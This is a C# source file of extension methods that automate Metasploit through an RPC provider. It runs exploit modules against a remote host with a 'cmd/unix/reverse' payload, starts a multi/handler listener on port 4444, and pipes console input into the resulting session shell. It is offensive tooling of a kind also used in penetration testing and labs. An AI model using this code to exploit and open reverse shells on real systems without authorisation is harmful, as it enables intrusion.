using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Models.Modules;
using Lacey.Alexa.Common.Metasploit.Providers;
using Lacey.Alexa.Common.Metasploit.Utils;

namespace Lacey.Alexa.Common.Metasploit.Extensions
{
    public static class ProviderExtensions
    {
        public static async Task ShellInteract(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            while (true)
            {
                var cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    await metasploit.StopSession(sessionId);
                    break;
                }

                await metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
                await metasploit.ReadSessionShell(sessionId);
            }
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> ExecuteModuleJob(
            this IMetasploitProvider metasploit, 
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            var jobId = response["job_id"].ToString();
            return (response, jobId);
        }

        public static async Task<Dictionary<string, object>> ExecuteModule(
            this IMetasploitProvider metasploit, 
            MetasploitModule module)
        {
            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            return response;
        }

        public static async Task<Dictionary<string, object>> WaitModuleJob(
            this IMetasploitProvider metasploit, 
            string moduleName,
            string jobId)
        {
            var response = await metasploit.ListJobs();
            var vals = new List<object>(response.Values);
            while (vals.Any(v => ((string)v).Contains(moduleName)))
            {
                Delay.Small();
                response = await metasploit.ListJobs();
                vals = new List<object>(response.Values);
            }

            await metasploit.StopJob(jobId);
            response = await metasploit.ListSessions();

            return response;
        }

        public static async Task<(Dictionary<string, object> Result, string JobId)> MultiHandler(
            this IMetasploitProvider metasploit)
        {
            var module = new MetasploitModule("exploit", "multi/handler")
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(4444)
                .Payload("cmd/unix/reverse")
                .ExitOnSession(false);

            return await metasploit.ExecuteModuleJob(module);
        }

        public static async Task<Dictionary<string, object>> Exploit(
            this IMetasploitProvider metasploit,
            string moduleName,
            string rHost)
        {
            var module = new MetasploitModule("exploit", moduleName)
                .RHost(rHost)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(4444)
                .Payload("cmd/unix/reverse")
                .DisablePayloadHandler(true);

            return await metasploit.ExecuteModule(module);
        }
    }
}